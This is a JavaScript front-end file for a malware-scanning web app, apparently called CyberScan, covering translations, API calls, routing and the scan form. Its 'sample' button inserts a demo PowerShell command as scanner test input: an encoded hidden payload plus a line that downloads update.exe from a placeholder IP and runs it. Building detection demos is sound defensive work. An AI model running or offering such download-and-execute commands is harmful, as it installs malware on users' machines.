"use strict";

/* ===================================================================
 * Core: language, API, toasts, dialogs, routing, the cells backdrop.
 * Exposed as window.CS for landing.js and repair.js.
 * =================================================================== */
const TOKEN = document.querySelector('meta[name="cyberscan-token"]').content;
const $ = (id) => document.getElementById(id);
const el = (tag, cls, text) => { const n = document.createElement(tag); if (cls) n.className = cls; if (text !== undefined) n.textContent = text; return n; };

let lang = "en";
try { const saved = localStorage.getItem("cyberscan-lang"); if (saved && CS_LANGS.has(saved)) lang = saved; } catch { /* storage off */ }
const t = (key) => (I18N[lang] && I18N[lang][key] !== undefined ? I18N[lang][key] : I18N.en[key]);
/* A text that may be a function (plural forms: rFindingCount(n)) or a template with {n}/{d} slots:
 * works either way, so a translation can switch between the two without breaking a caller. */
const tf = (key, vars = {}) => {
  const v = t(key);
  if (typeof v === "function") return String(v(...Object.values(vars)));
  return String(v ?? "").replace(/\{(\w+)\}/g, (m, k) => (vars[k] !== undefined ? vars[k] : m));
};
/* A value the server may send as plain text or as {en, ar, ...}: the current language's. */
const loc = (v) => {
  if (v == null) return "";
  if (typeof v === "object" && !Array.isArray(v)) return String(v[lang] ?? v.en ?? Object.values(v)[0] ?? "");
  return String(v);
};

/* The app's own texts (new since the shared dictionary in js/i18n.js); other languages fall back to English. */
const APPX = {
  en: {
    errTitle: "The check didn't finish", errRetry: "Try again", errOther: "Choose another file", errEditLink: "Edit the link", errEditText: "Edit the text",
    errNetwork: "CyberScan lost contact with the scanner. Check that it is still running, then try again.",
    errTimeout: "The check took longer than the time limit and was stopped. You can try again, or raise the limit in Settings.",
    errTooBig: "This file is larger than the {n} MB limit, so it wasn't checked.",
    errBusy: "The scanner is busy with other checks right now. Wait a moment and try again.",
    errRejected: "The scanner couldn't read this input. Check it and try again.",
    errGeneric: "Something went wrong while checking. Nothing was opened or run. Try again in a moment.",
    sev: { critical: "Critical", high: "High", medium: "Medium", low: "Low", info: "Info" },
    navScan: "Scan", navTools: "Protection", navToolbox: "Toolbox", navHistory: "History", navRepair: "Repair", navSettings: "Settings",
    palette: "Search and commands", home: "CyberScan home",
    sizeCap: "The scanner itself never reads more than {n} MB per file.",
    copyHead: "CyberScan report", cScore: "Score", cVerdict: "Result", cTarget: "Checked", cFindings: "What was found", cNone: "No warning signs were observed.",
    cEngines: "Checks", cWhen: "Scanned", cSha: "SHA-256", cNote: "The score is weighted evidence from all checks, not a probability. Static analysis only: nothing was opened or run.",
    elapsed: "Took {s} s",
    stStatic: "Static findings collected · {n}", stEntropy: "Entropy and structure measured · {n} window(s)", stCoords: "Structure map ready · {n} points · no trained model",
    stLookups: "Online lookups: {s} · no file contents are sent",
    lk: { no_match: "no match", match: "match found", disabled: "off", invalid_indicator: "not applicable here", skipped: "skipped", error: "unavailable", timeout: "no answer in time", unavailable: "unavailable", not_found: "not listed" },
    eng: { not_pe: "Not a Windows program", no_match: "No match", invalid_indicator: "Not applicable", enabled: "On", disabled: "Off", match: "Match found" },
    bytes: "{n} bytes", scoreLine: "{n} out of 100 · weighted evidence, not a probability",
    engNames: {},
    vEmpty: "Empty file", vEmptyBody: "This file has no content, so there is nothing to check.",
    techEvidence: "Every finding, with the check that found it and its weight", intelUrl: "Who was asked about this link, and what each one answered.", intelText: "Who was asked about this text, and what each one answered.",
    tabsLabel: "Result details",
    pastedText: "Pasted text", limitsText: "Static analysis only: nothing was opened or run. No trained machine-learning model is installed, so this result rests on rules and measured evidence.",
    types: { pdf: "PDF document", text: "Text", txt: "Text", url: "Link", link: "Link", zip: "ZIP archive", pe: "Windows program", exe: "Windows program", elf: "Linux program", docx: "Word document", doc: "Word document", xlsx: "Excel workbook", xls: "Excel workbook", pptx: "PowerPoint presentation", ppt: "PowerPoint presentation", office: "Office document", ole: "Office document (old format)", rtf: "RTF document", msg: "Outlook message", eml: "Email", email: "Email", apk: "Android app", image: "Image", png: "PNG image", jpeg: "JPEG image", jpg: "JPEG image", gif: "GIF image", html: "Web page", script: "Script", archive: "Archive", file: "File", binary: "Binary data", unknown: "Unknown" },
    cMode: "Kind", cScanned: "Scanned", cElapsed: "Duration", cEngine: "Engine", cWhere: "Source",
    retryNone: "Nothing to retry: choose the file again.",
    sizeCapPublic: "On the public website the limit is {n} MB per file.",
    navLabel: "Main", palShort: "Search or run a command…",
    pwEmpty: "Type a password first. It is checked in this browser; only part of its fingerprint is sent.",
  },
  ar: {
    errTitle: "لم يكتمل الفحص", errRetry: "أعد المحاولة", errOther: "اختر ملفًا آخر", errEditLink: "عدّل الرابط", errEditText: "عدّل النص",
    errNetwork: "انقطع اتصال CyberScan بالماسح. تأكد أنه ما زال يعمل ثم أعد المحاولة.",
    errTimeout: "استغرق الفحص أطول من المهلة فأُوقف. يمكنك إعادة المحاولة أو رفع المهلة من الإعدادات.",
    errTooBig: "هذا الملف أكبر من الحد ({n} ميغابايت)، لذلك لم يُفحص.",
    errBusy: "الماسح مشغول بفحوص أخرى الآن. انتظر قليلًا ثم أعد المحاولة.",
    errRejected: "تعذّر على الماسح قراءة هذا الإدخال. تحقق منه ثم أعد المحاولة.",
    errGeneric: "حدث خطأ أثناء الفحص. لم يُفتح أو يُشغَّل أي شيء. أعد المحاولة بعد لحظات.",
    sev: { critical: "حرج", high: "مرتفع", medium: "متوسط", low: "منخفض", info: "معلومة" },
    navScan: "الفحص", navTools: "الحماية", navToolbox: "صندوق الأدوات", navHistory: "السجل", navRepair: "الإصلاح", navSettings: "الإعدادات",
    palette: "البحث والأوامر", home: "الصفحة الرئيسية لـ CyberScan",
    sizeCap: "لا يقرأ الماسح نفسه أكثر من {n} ميغابايت لكل ملف.",
    copyHead: "تقرير CyberScan", cScore: "الدرجة", cVerdict: "النتيجة", cTarget: "ما فُحص", cFindings: "ما وُجد", cNone: "لم تُرصد علامات تحذير.",
    cEngines: "الفحوص", cWhen: "وقت الفحص", cSha: "SHA-256", cNote: "الدرجة أدلة موزونة من كل الفحوص، وليست احتمالًا. تحليل ساكن فقط: لم يُفتح أو يُشغَّل أي شيء.",
    elapsed: "استغرق {s} ث",
    stStatic: "جُمعت الأدلة الساكنة · {n}", stEntropy: "قيست الإنتروبيا والبنية · {n} نافذة", stCoords: "خريطة البنية جاهزة · {n} نقطة · لا يوجد نموذج مدرَّب",
    stLookups: "البحث عبر الإنترنت: {s} · لا يُرسل أي محتوى من الملف",
    lk: { no_match: "لا تطابق", match: "وُجد تطابق", disabled: "متوقف", invalid_indicator: "لا ينطبق هنا", skipped: "تُخطّي", error: "غير متاح", timeout: "لم يُجب في الوقت", unavailable: "غير متاح", not_found: "غير مُدرج" },
    eng: { not_pe: "ليس برنامج Windows", no_match: "لا تطابق", invalid_indicator: "لا ينطبق", enabled: "مفعّل", disabled: "متوقف", match: "وُجد تطابق" },
    bytes: "{n} بايت", scoreLine: "{n} من 100 · أدلة موزونة، وليست احتمالًا",
    engNames: { "Content inspection": "فحص المحتوى", Heuristics: "القواعد الاستدلالية", OSINT: "البحث عبر الإنترنت", "YARA-Forge": "قواعد YARA-Forge", "Threat lists": "قوائم التهديدات", "Secret patterns": "أنماط الأسرار", "Hash database": "قاعدة البصمات", YARA: "قواعد YARA", PE: "بنية البرنامج", ML: "نموذج التعلّم", Archive: "محتويات الأرشيف" },
    vEmpty: "ملف فارغ", vEmptyBody: "لا يحتوي هذا الملف على أي محتوى، فلا يوجد ما يُفحص.",
    techEvidence: "كل ما وُجد، مع الفحص الذي وجده ووزنه", intelUrl: "من سُئل عن هذا الرابط، وبماذا أجاب كل مصدر.", intelText: "من سُئل عن هذا النص، وبماذا أجاب كل مصدر.",
    tabsLabel: "تفاصيل النتيجة",
    pastedText: "نص ملصق", limitsText: "تحليل ساكن فقط: لم يُفتح أو يُشغَّل أي شيء. لا يوجد نموذج تعلّم آلي مدرَّب مثبّت، لذلك تعتمد هذه النتيجة على القواعد والأدلة المقيسة.",
    types: { pdf: "مستند PDF", text: "نص", txt: "نص", url: "رابط", link: "رابط", zip: "أرشيف ZIP", pe: "برنامج Windows", exe: "برنامج Windows", elf: "برنامج Linux", docx: "مستند Word", doc: "مستند Word", xlsx: "مصنف Excel", xls: "مصنف Excel", pptx: "عرض PowerPoint", ppt: "عرض PowerPoint", office: "مستند Office", ole: "مستند Office (صيغة قديمة)", rtf: "مستند RTF", msg: "رسالة Outlook", eml: "بريد إلكتروني", email: "بريد إلكتروني", apk: "تطبيق Android", image: "صورة", png: "صورة PNG", jpeg: "صورة JPEG", jpg: "صورة JPEG", gif: "صورة GIF", html: "صفحة ويب", script: "سكربت", archive: "أرشيف", file: "ملف", binary: "بيانات ثنائية", unknown: "غير معروف" },
    cMode: "النوع", cScanned: "وقت الفحص", cElapsed: "المدة", cEngine: "المحرك", cWhere: "المصدر",
    retryNone: "لا يوجد ما يُعاد: اختر الملف مرة أخرى.",
    sizeCapPublic: "في الموقع العام الحد {n} ميغابايت لكل ملف.",
    navLabel: "التنقل الرئيسي", palShort: "ابحث أو شغّل أمرًا…",
    pwEmpty: "اكتب كلمة مرور أولًا. تُفحص في هذا المتصفح، ولا يُرسل إلا جزء من بصمتها.",
  },
};
const ax = (key, vars) => {
  const v = (APPX[lang === "ar" ? "ar" : "en"][key] ?? APPX.en[key]);
  return vars && typeof v === "string" ? v.replace(/\{(\w+)\}/g, (m, k) => (vars[k] !== undefined ? vars[k] : m)) : v;
};
/* [badge, title, sentence] for a verdict code, including the ones the shared dictionary lacks (EMPTY). */
function verdictWords(cls) {
  const v = t("verdicts")[cls];
  if (v) return v;
  if (cls === "EMPTY") return [ax("vEmpty"), ax("vEmpty"), ax("vEmptyBody")];
  return [t("verdictUnknown"), t("verdictUnknownTitle"), t("verdictUnknownBody")];
}
const sevWord = (s) => { const k = String(s || "info").toLowerCase(); return ax("sev")[k] || ax("sev").info; };

/* The score and the verdict shown everywhere (result, report, exports): the backend's single final
 * score when it sends one; otherwise the stronger of the combined and content scores (the strongest
 * evidence sets the floor). The badge always follows the band of the score shown:
 * 0 = no indicators, 1-49 = review, 50+ = suspicious; an exact known-malware listing stays itself. */
function verdictOf(r) {
  const ds = (r && r.detection_summary) || {};
  const fin = [ds.final_score, r && r.final_score].find((v) => v !== undefined && v !== null && Number.isFinite(Number(v)));
  const raw = fin !== undefined ? Number(fin) : Math.max(Number(r && r.combined_score) || 0, Number(ds.content_score) || 0);
  const score = Math.max(0, Math.min(100, Math.round(raw)));
  let cls = ds.classification || (r && r.classification) || "UNKNOWN";
  if (cls !== "KNOWN_MALWARE" && cls !== "UNKNOWN" && cls !== "EMPTY") cls = score >= 50 ? "SUSPICIOUS" : score > 0 ? "REVIEW" : "NO_INDICATORS_OBSERVED";
  return { score, cls };
}
/* Server-measured duration in seconds, whichever name the server uses for it. */
function elapsedOf(r) {
  if (!r) return null;
  const ds = r.detection_summary || {};
  const ms = r.elapsed_ms ?? r.server_elapsed_ms ?? ds.elapsed_ms;
  if (ms != null && Number.isFinite(Number(ms))) return Number(ms) / 1000;
  const s = r.server_elapsed ?? r.elapsed;
  return s != null && Number.isFinite(Number(s)) ? Number(s) : null;
}
const modeOf = (r) => { const m = String((r && r.mode) || "").toLowerCase(); return m === "url" || m === "link" ? "url" : m === "text" ? "text" : "file"; };
/* A detected type ("pdf", "Text", "URL"...) in words, in the user's language. */
function typeLabel(v) {
  const k = String(v || "").trim().toLowerCase().replace(/^\./, "");
  if (!k) return "";
  return ax("types")[k] || (/^[a-z0-9]{1,6}$/.test(k) ? k.toUpperCase() : String(v));
}
/* What was checked, as a person would name it: the whole link, "Pasted text", or the file's name. */
function targetLabel(r, full) {
  const target = String((r && r.target) || "");
  const mode = modeOf(r);
  if (mode === "url") return target;
  if (mode === "text") return !target || /^pasted text$/i.test(target) || target === "<text>" ? ax("pastedText") : target;
  return full ? target : (target.split(/[\\/]/).filter(Boolean).pop() || target);
}
/* The limits line under a result: the server's sentence is English-only, so a known one is said in the user's words. */
function limitsLabel(r) {
  const s = loc(r && r.limitations);
  if (!s) return "";
  if (lang === "en" && !/trained structural classifier|supervised model requires/i.test(s)) return s;
  return ax("limitsText");
}
/* Any failure, said for a person: never the raw exception text. */
const capMB = () => (state.settings && state.settings.public ? 4 : 50);
function friendlyError(err) {
  if (err && err.friendly) return err.friendly;
  // the server's own plain words ({code, en, ar}) when it sends them
  const info = (err && (err.info || (err.response && (err.response.error_info || (typeof err.response.error === "object" && err.response.error))))) || null;
  if (info && typeof info === "object") {
    const byCode = { timeout: "errTimeout", busy: "errBusy", too_large: "errTooBig", empty_input: "errRejected", unreadable: "errRejected", not_found: "errRejected", analysis_failed: "errGeneric" };
    if (info[lang]) return String(info[lang]);
    if (byCode[info.code]) return ax(byCode[info.code], { n: capMB() });
  }
  const status = Number(err && err.status) || 0;
  const msg = String((err && err.message) || err || "");
  if ((err && err.kind === "network") || /failed to fetch|networkerror|network ?error|load failed|lost contact/i.test(msg) || msg === t("network")) return ax("errNetwork");
  if (status === 413 || /too large|too big|exceeds|larger than|maximum (file )?size/i.test(msg)) return ax("errTooBig", { n: capMB() });
  if (status === 429 || status === 503 || /busy|too many|capacity|queue full|rate limit/i.test(msg)) return ax("errBusy");
  if (status === 504 || /timed? ?out|timeout|took too long|deadline|time limit/i.test(msg)) return ax("errTimeout");
  if ((status >= 400 && status < 500) || /invalid|rejected|unsupported|required|empty|not allowed/i.test(msg)) return ax("errRejected");
  return ax("errGeneric");
}

/* Stage details arrive as English sentences (or {en, ar} once the server sends both): say them in the user's language. */
function stageText(d) {
  if (d && typeof d === "object") return loc(d);
  const s = String(d || "");
  let m;
  if ((m = /^Static findings collected · ([\d,.]+) bytes?$/.exec(s))) return ax("stStatic", { n: ax("bytes", { n: m[1] }) });
  if ((m = /^Entropy and structure measured · (\d+) windows?$/.exec(s))) return ax("stEntropy", { n: m[1] });
  if ((m = /^(\d+) coordinates ready · classifier untrained$/.exec(s))) return ax("stCoords", { n: m[1] });
  if ((m = /^Public lookups (\w+) · no file contents are submitted$/.exec(s))) return ax("stLookups", { s: ax("lk")[m[1]] || m[1].replace(/_/g, " ") });
  return s;
}

const state = {
  mode: "file", file: null, diskPath: null, lastResult: null, polling: null,
  view: null, history: null, filter: "all", settings: null, ai: null, aiJob: null,
  eventsSince: 0, cube: null,
};

const langListeners = [];
function applyLang() {
  document.documentElement.lang = lang;
  document.documentElement.dir = CS_LANGS.dir(lang);
  document.querySelectorAll(".lang-btn").forEach((b) => { b.textContent = CS_LANGS.names[lang]; b.setAttribute("aria-label", `Language: ${CS_LANGS.names[lang]}`); });
  document.querySelectorAll("[data-i18n]").forEach((node) => {
    if (node.dataset.keep) return;
    const value = t(node.dataset.i18n);
    if (typeof value === "string") node.textContent = value;
  });
  document.querySelectorAll("[data-i18n-ph]").forEach((node) => { node.placeholder = t(node.dataset.i18nPh); });
  // accessible names for controls that show no text (screen readers read these)
  document.querySelectorAll("[data-i18n-aria]").forEach((node) => {
    const value = t(node.dataset.i18nAria);
    if (typeof value === "string" && value !== node.dataset.i18nAria) node.setAttribute("aria-label", value);
  });
  // names for controls that show only an icon on small screens
  document.querySelectorAll(".nav-btn").forEach((b) => { const s = b.querySelector("span"); if (s) b.setAttribute("aria-label", s.textContent.trim()); });
  document.querySelectorAll(".nav").forEach((n) => n.setAttribute("aria-label", ax("navLabel")));
  document.querySelectorAll(".pal-open").forEach((b) => { b.setAttribute("aria-label", ax("palette")); b.title = ax("palette"); });
  document.querySelectorAll("#app .brand").forEach((b) => { b.setAttribute("aria-label", ax("home")); b.title = ax("home"); });
  if ($("batch-file")) $("batch-file").setAttribute("aria-label", t("bAdd"));
  requestAnimationFrame(() => { moveInk(); moveNavInk(); });
  if (state.lastResult && !$("result").hidden) renderResult(state.lastResult, false);
  if (state.view === "history" && state.history) renderHistory(false);
  if (state.settings) renderSettings();
  renderLegend($("r-legend"));
  langListeners.forEach((fn) => fn());
}
async function setLang(code) {
  if (!CS_LANGS.has(code)) return;
  try { await CS_LANGS.load(code); } catch { toast("Language file could not be loaded."); return; }
  lang = code;
  try { localStorage.setItem("cyberscan-lang", lang); } catch { /* storage off */ }
  applyLang();
}
function openLangMenu(anchor) {
  CS_LANGS.openMenu(anchor || document.querySelector(".top .lang-btn") || document.querySelector(".lang-btn"), lang, setLang);
}
document.querySelectorAll(".lang-btn").forEach((b) => b.addEventListener("click", () => openLangMenu(b)));

async function api(path, options = {}) {
  const res = await fetch(path, { ...options, headers: { "X-CyberScan-Token": TOKEN, "X-CyberScan-Lang": lang, ...(options.headers || {}) } });
  const body = await res.json().catch(() => ({}));
  if (!res.ok) {
    const error = body.error;
    const failure = new Error((typeof error === "string" ? error : error && error.message) || `HTTP ${res.status}`);
    failure.response = body;
    failure.status = res.status;
    throw failure;
  }
  return body;
}
/* Upload a file with real progress: "cs:upload" events carry the bytes the browser has sent. */
function uploadFile(path, file, headers) {
  return new Promise((resolve, reject) => {
    const x = new XMLHttpRequest();
    x.open("POST", path);
    Object.entries({ "X-CyberScan-Token": TOKEN, "X-CyberScan-Lang": lang, ...(headers || {}) }).forEach(([k, v]) => x.setRequestHeader(k, v));
    const emit = (loaded, done) => window.dispatchEvent(new CustomEvent("cs:upload", { detail: { loaded, total: file.size, done: !!done } }));
    x.upload.onprogress = (e) => emit(e.loaded, false);
    x.upload.onload = () => emit(file.size, true);
    x.onload = () => {
      let body = {};
      try { body = JSON.parse(x.responseText || "{}"); } catch { /* not JSON */ }
      if (x.status >= 200 && x.status < 300) { resolve(body); return; }
      const error = body.error;
      const failure = new Error((typeof error === "string" ? error : error && error.message) || `HTTP ${x.status}`);
      failure.response = body;
      failure.status = x.status;
      reject(failure);
    };
    x.onerror = () => { const failure = new Error(t("network")); failure.kind = "network"; reject(failure); };
    x.send(file);
  });
}
const postJSON = (path, data, method = "POST") => api(path, { method, headers: { "Content-Type": "application/json" }, body: JSON.stringify(data || {}) });

/* "report.pdf" -> "report-repaired.pdf" (a name that already says so is kept). */
function repairedName(name) {
  const n = String(name || "file");
  if (/[-_ ]repaired(\.[^.]*)?$/i.test(n)) return n;
  const dot = n.lastIndexOf(".");
  return dot > 0 ? `${n.slice(0, dot)}-repaired${n.slice(dot)}` : `${n}-repaired`;
}
async function download(path, rename) {
  const res = await fetch(path, { headers: { "X-CyberScan-Token": TOKEN } });
  if (!res.ok) { const e = new Error((await res.json().catch(() => ({}))).error || `HTTP ${res.status}`); e.status = res.status; throw e; }
  const disposition = res.headers.get("Content-Disposition") || "";
  const match = /filename\*=UTF-8''([^;]+)/.exec(disposition) || /filename="?([^";]+)"?/.exec(disposition);
  let name = match ? decodeURIComponent(match[1]) : "download";
  if (typeof rename === "function") name = rename(name);
  const url = URL.createObjectURL(await res.blob());
  const a = el("a"); a.href = url; a.download = name; document.body.append(a); a.click(); a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 4000);
}

function toast(message, action) {
  const box = el("div", "toast");
  box.append(el("span", "", message));
  if (action) {
    const b = el("button", "primary", action.label);
    b.type = "button";
    b.addEventListener("click", () => { action.run(); close(); });
    box.append(b);
  }
  $("toasts").append(box);
  const close = () => { box.classList.add("out"); box.addEventListener("animationend", () => box.remove(), { once: true }); };
  setTimeout(close, action ? 9000 : 2800);
}

function confirmDialog(title, body, okLabel) {
  const dialog = $("confirm");
  $("confirm-title").textContent = title;
  $("confirm-body").textContent = body;
  $("confirm-ok").textContent = okLabel;
  dialog.returnValue = "";
  dialog.showModal();
  return new Promise((resolve) => dialog.addEventListener("close", () => resolve(dialog.returnValue === "ok"), { once: true }));
}

const cells = window.CyberCells ? CyberCells.create($("cells"), { mode: "hero" }) : null;

/* ---------------- routing ---------------- */
const VIEWS = ["scan", "tools", "toolbox", "history", "repair", "settings"];
let entered = false;
/* Two pages: the landing (ainex-ai.xyz) and the scan app (scan.ainex-ai.xyz),
 * which the server builds from this page without the landing and its heavy
 * scripts. The server writes their addresses into these meta tags. */
const SCAN_PAGE = !$("landing");
const metaUrl = (name, fallback) => {
  const v = (document.querySelector(`meta[name="${name}"]`) || {}).content || "";
  return v && !v.startsWith("__") ? v : fallback;
};
const SCAN_URL = metaUrl("cyberscan-scan-url", "app.html");
const HOME_URL = metaUrl("cyberscan-home-url", "/");
function openScanPage(view) {
  location.href = `${SCAN_URL}#/${view || "scan"}`;
}
function route() {
  const hash = location.hash.replace(/^#\/?/, "");
  // other names people use for a view (#/protection is the Protection page)
  const ALIAS = { protection: "tools" };
  const first = ALIAS[hash.split("/")[0]] || hash.split("/")[0];
  let view = VIEWS.includes(first) ? first : null;
  // an address the app doesn't know opens the scan page, and the address says so
  if (SCAN_PAGE && !view) { view = "scan"; if (hash && hash !== "scan") history.replaceState(null, "", "#/scan"); }
  // old links such as ainex-ai.xyz/#/scan: the app now lives on its own page
  if (!SCAN_PAGE && view) { location.replace(`${SCAN_URL}#/${view}`); return; }
  const onLanding = !view;
  document.body.classList.toggle("on-landing", onLanding);
  if ($("landing")) $("landing").hidden = !onLanding;
  $("app").hidden = onLanding;
  if (cells) cells.setMode(onLanding ? "hero" : "ambient");
  if (onLanding) { state.view = null; window.dispatchEvent(new Event("cs:landing")); return; }
  // the first view appears at once (no entrance fade): the page's first paint waits for nothing
  if (!entered) { entered = true; $("app").classList.add("enter"); showView(view, true); return; }
  if (document.startViewTransition && state.view && state.view !== view && !matchMedia("(prefers-reduced-motion: reduce)").matches) {
    const order = VIEWS.indexOf(view) - VIEWS.indexOf(state.view);
    document.documentElement.dataset.vtDir = (order > 0) !== CS_LANGS.rtl.has(lang) ? "fwd" : "back";
    document.startViewTransition(() => showView(view));
  } else showView(view);
}
window.addEventListener("hashchange", route);

async function enterApp(x, y) {
  if (!SCAN_PAGE) {
    // a short warp, then the scan page
    const v = document.querySelector(".warp-veil");
    if (v) {
      v.style.setProperty("--wx", `${x ?? innerWidth / 2}px`);
      v.style.setProperty("--wy", `${y ?? innerHeight / 2}px`);
      v.classList.remove("go"); void v.offsetWidth; v.classList.add("go");
      await new Promise((r) => setTimeout(r, 420));
    }
    openScanPage("scan");
    return;
  }
  const veil = document.querySelector(".warp-veil");
  veil.style.setProperty("--wx", `${x ?? innerWidth / 2}px`);
  veil.style.setProperty("--wy", `${y ?? innerHeight / 2}px`);
  veil.classList.remove("go"); void veil.offsetWidth; veil.classList.add("go");
  const warp = cells ? cells.warp(x, y, 700) : Promise.resolve();
  await new Promise((r) => setTimeout(r, 640));
  location.hash = "#/scan";
  window.scrollTo(0, 0);
  await warp;
  setTimeout(() => veil.classList.remove("go"), 700);
}

/* ---------------- app navigation ---------------- */
const navButtons = [...document.querySelectorAll(".nav-btn")];
const navInk = document.querySelector(".nav-ink");
function moveNavInk() {
  const active = document.querySelector(".nav-btn.active");
  if (!active || $("app").hidden) return;
  const box = active.parentElement.getBoundingClientRect();
  const r = active.getBoundingClientRect();
  navInk.style.width = `${r.width}px`;
  navInk.style.transform = `translateX(${r.left - box.left}px)`;
}
window.addEventListener("resize", moveNavInk);
// Scan, clicked while a result (or an error) is on screen, opens the form for a new check
navButtons.forEach((b) => b.addEventListener("click", () => {
  const busy = !$("progress").hidden && !$("progress").classList.contains("failed");   // a check still running is left alone
  if (b.dataset.view === "scan" && state.view === "scan" && (!$("result").hidden || !$("error").hidden) && !busy) newScan();
}));

function showView(view, first = false) {
  const changed = state.view !== view;
  state.view = view;
  // coming back to Scan from another page offers a new scan; the last result stays in Recent scans and History
  if (view === "scan" && changed && !(performance.now() < (state.keepResult || 0)) && !$("result").hidden) newScan();
  navButtons.forEach((b) => {
    const on = b.dataset.view === view;
    b.classList.toggle("active", on);
    if (on) b.setAttribute("aria-current", "page"); else b.removeAttribute("aria-current");
  });
  document.querySelectorAll(".view").forEach((v) => {
    const on = v.id === `view-${view}`;
    v.hidden = !on;
    if (on && changed && !(first && SCAN_PAGE)) { v.classList.remove("entering"); void v.offsetWidth; v.classList.add("entering"); }
  });
  requestAnimationFrame(() => { moveNavInk(); moveInk(); });
  if (view === "history") loadHistory();
  if (view === "settings") { loadSettings(); loadKeys(); loadAiStatus(true); }
  window.dispatchEvent(new CustomEvent("cs:view", { detail: view }));
  if (changed) window.scrollTo({ top: 0, behavior: "smooth" });
}

/* ===================================================================
 * Scan composer
 * =================================================================== */
const tabs = [...document.querySelectorAll(".tab")];
const ink = document.querySelector(".tab-ink");
function moveInk() {
  const active = document.querySelector(".tab.active");
  if (!active || !active.offsetParent) return;
  const box = active.parentElement.getBoundingClientRect();
  const r = active.getBoundingClientRect();
  ink.style.width = `${r.width}px`;
  ink.style.transform = `translateX(${r.left - box.left}px)`;
}
/* Tabs the keyboard can reach: one stop in the Tab order; arrows (mirrored right to left), Home and End move between them. */
function roving(list, select) {
  list.forEach((b, i) => b.addEventListener("keydown", (e) => {
    const rtl = document.documentElement.dir === "rtl";
    let j = null;
    if (e.key === "ArrowRight") j = i + (rtl ? -1 : 1);
    else if (e.key === "ArrowLeft") j = i + (rtl ? 1 : -1);
    else if (e.key === "Home") j = 0;
    else if (e.key === "End") j = list.length - 1;
    if (j === null) return;
    e.preventDefault();
    const next = list[(j + list.length) % list.length];
    next.focus();
    select(next);
  }));
}
const PANEL_IDS = { file: "panel-file", url: "url", text: "panel-text" };
document.querySelector('#form [data-panel="file"]').id = "panel-file";
document.querySelector('#form [data-panel="text"]').id = "panel-text";
tabs.forEach((tab) => {
  tab.id = `tab-${tab.dataset.mode}`;
  tab.setAttribute("aria-controls", PANEL_IDS[tab.dataset.mode]);
  tab.tabIndex = tab.classList.contains("active") ? 0 : -1;
  const panel = $(PANEL_IDS[tab.dataset.mode]);
  if (panel && panel.tagName === "DIV") { panel.setAttribute("role", "tabpanel"); panel.setAttribute("aria-labelledby", tab.id); }
});
roving(tabs, (tab) => tab.click());
tabs.forEach((tab) => tab.addEventListener("click", () => {
  state.mode = tab.dataset.mode;
  tabs.forEach((x) => { x.classList.toggle("active", x === tab); x.setAttribute("aria-selected", x === tab); x.tabIndex = x === tab ? 0 : -1; });
  document.querySelectorAll("#form [data-panel]").forEach((p) => { p.hidden = p.dataset.panel !== state.mode; });
  moveInk();
  updateReady();
  const field = state.mode === "url" ? $("url") : state.mode === "text" ? $("text") : null;
  if (field) field.focus();
}));
window.addEventListener("resize", moveInk);

const drop = $("drop");
function chooseFile(file) {
  if (!file) return;
  state.file = file;
  state.diskPath = null;
  drop.classList.add("chosen");
  $("drop-label").dataset.keep = "1";
  $("drop-label").textContent = `${file.name} · ${formatBytes(file.size)}`;
  updateReady();
  if (window.CSHash) CSHash.check(file);
}
function chooseFiles(files) {
  const list = [...(files || [])];
  if (list.length > 1 && window.CSBatch) { CSBatch.start(list); return; }
  chooseFile(list[0]);
}
function chooseDisk(path, name, size) {
  state.diskPath = path;
  state.file = null;
  if (window.CSHash) CSHash.clear();
  drop.classList.add("chosen");
  $("drop-label").dataset.keep = "1";
  $("drop-label").textContent = `${name} · ${formatBytes(size || 0)}`;
  updateReady();
}
function resetChoice() {
  state.file = null; state.diskPath = null;
  drop.classList.remove("chosen");
  delete $("drop-label").dataset.keep;
  $("drop-label").textContent = t("dropTitle");
  $("file").value = "";
  if (window.CSHash) CSHash.clear();
}
$("file").addEventListener("change", (e) => chooseFiles(e.target.files));
["dragenter", "dragover"].forEach((ev) => drop.addEventListener(ev, (e) => { e.preventDefault(); drop.classList.add("over"); }));
["dragleave", "drop"].forEach((ev) => drop.addEventListener(ev, (e) => { e.preventDefault(); e.stopPropagation(); drop.classList.remove("over"); }));
drop.addEventListener("drop", (e) => chooseFiles(e.dataTransfer.files));
// keyboard: the drop zone opens the file picker on Enter or Space
drop.addEventListener("keydown", (e) => { if (e.target === drop && (e.key === "Enter" || e.key === " ")) { e.preventDefault(); $("file").click(); } });
$("pick-disk").addEventListener("click", async () => {
  $("pick-disk").disabled = true;
  try {
    const picked = await postJSON("/api/pick", { kind: "file" });
    if (picked.path && picked.name) chooseDisk(picked.path, picked.name, picked.size);
  } catch (err) { toast(err.message); }
  $("pick-disk").disabled = false;
});
$("url").addEventListener("input", updateReady);
$("text").addEventListener("input", updateReady);
$("sample").addEventListener("click", () => {
  $("text").value = "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\nInvoke-WebRequest http://198.51.100.7/update.exe -OutFile $env:TEMP\\update.exe; Start-Process $env:TEMP\\update.exe";
  updateReady();
  $("text").focus();
});

/* the same ceiling the server applies: the setting, capped at 50 MB (4 MB on the public site) */
const limitBytes = () => Math.min(state.settings?.maximum_file_size || Infinity, capMB() * 1048576);
function updateReady() {
  // an empty file, or one over the limit, can't be checked: the file card says why
  const fileOk = state.diskPath || (state.file && state.file.size > 0 && state.file.size <= limitBytes());
  const ready = state.mode === "file" ? !!fileOk
    : state.mode === "url" ? $("url").value.trim().length > 3
    : $("text").value.trim().length > 0;
  $("go").disabled = !ready;
}

function formatBytes(n) {
  if (n < 1024) return `${n} B`;
  if (n < 1048576) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / 1048576).toFixed(1)} MB`;
}

$("form").addEventListener("submit", (e) => {
  e.preventDefault();
  if ($("go").disabled) return;
  runScan();
});

/* Whether this scan also asks VirusTotal and the other outside services (only the fingerprint or the
 * link is sent, never the file). The switch is js/external-intel.js; the choice stays in this browser. */
const externalOn = () => { try { return localStorage.getItem("cs-external-intel") !== "0"; } catch { return true; } };

/* One scan, from what the composer holds now (the "Try again" button calls this too). */
async function runScan() {
  if (state.mode === "file" && !state.file && !state.diskPath) { showError({ friendly: ax("retryNone") }); return; }
  if (state.mode === "file" && state.file && !state.diskPath && state.file.size > limitBytes()) {
    showError({ friendly: ax("errTooBig", { n: Math.round(limitBytes() / 1048576) }) });
    return;
  }
